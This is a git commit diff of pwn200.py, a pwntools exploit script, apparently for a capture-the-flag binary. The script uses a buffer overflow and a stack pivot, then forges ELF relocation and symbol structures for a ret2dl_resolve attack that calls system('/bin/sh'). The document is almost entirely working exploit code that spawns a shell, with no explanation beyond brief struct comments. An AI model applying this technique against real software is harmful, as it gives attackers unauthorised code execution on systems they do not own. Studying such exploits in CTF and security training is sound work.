3d34cd348c6184d2130916cb6c224daf7046301e
Michael-c0de <1679556937@qq.com>
2024-11-09 23:33:18 -0800

    ret2resolve

--- pwn200.py
+++ pwn200.py
@@ -2,10 +2,7 @@ from pwn import *
 context.arch="i386"
 elf = ELF('./pwn200')
 gadget = lambda x: next(elf.search(asm(x, os='linux', arch='i386')))
-
 p = process('./pwn200')
-
-# 0x8049165
 stack_privot  = gadget("leave; ret")
 
 bss = 0x0804c028+0x600 - 8
@@ -16,35 +13,37 @@ p.send(b"A"*108 + b''.join(p32(i) for i in [bss, # ebp
                                             stack_privot, # leave; ret
                                             0, bss, 0x400
                                             ]))
-# esp = rop_chain + 4
-# write2esp
-
-
 
 ELF32_sym = 0x8048248
-r_info =  (((bss + 0x200 + 8 - ELF32_sym))//0x10)*0x100 + 0x7
-fake_Elf32_Rel = b''.join(p32(i) for i in [
-    0x0804c028, # fake
-    r_info
-])
-print(f"fake_Elf32_Rel.r_info = {hex(r_info)}")
-
 dynstr = 0x80482e8
-st_name = bss + 0x200 + len(fake_Elf32_Rel) + 16 - dynstr
+rel_plt = 0x080483a0
+resolve_plt = 0x8049030
+fake_ptr = bss + 0x200
+
+r_info =  (((fake_ptr + 8 - ELF32_sym))//0x10)*0x100 + 0x7
+
+# typedef struct
+# {
+#   Elf32_Addr    r_offset;
+#   Elf32_Word    r_info;
+# } Elf32_Rel
+fake_Elf32_Rel = b''.join(p32(i) for i in [
+    bss - 0x100, # fake r_offset
+    r_info # fake r_info
+])
+
+st_name = fake_ptr + len(fake_Elf32_Rel) + 16 - dynstr
 fake_Elf32_Sym=b''.join(p32(i) for i in [
     st_name,
     0,
     0,
 ]) + p8(0x12) + p8(0) + p16(0)
-print(f"fake_Elf32_Sym.st_name = {hex(st_name)}")
 
 strings = b"system\x00/bin/sh\x00\x00"
 
-rel_plt = 0x080483a0
-resolve_plt = 0x8049030
 
-fake_rel_offset = bss + 0x200 - rel_plt
-fake_bin_sh = bss + 0x200 + len(fake_Elf32_Rel) + len(fake_Elf32_Sym) + 7
+fake_rel_offset = fake_ptr - rel_plt
+fake_bin_sh = fake_ptr + len(fake_Elf32_Rel) + len(fake_Elf32_Sym) + 7
 
 rop_chain = b''.join(p32(i) for i in [0, resolve_plt, fake_rel_offset, 0, fake_bin_sh]).ljust(0x200, b'\x00')
 
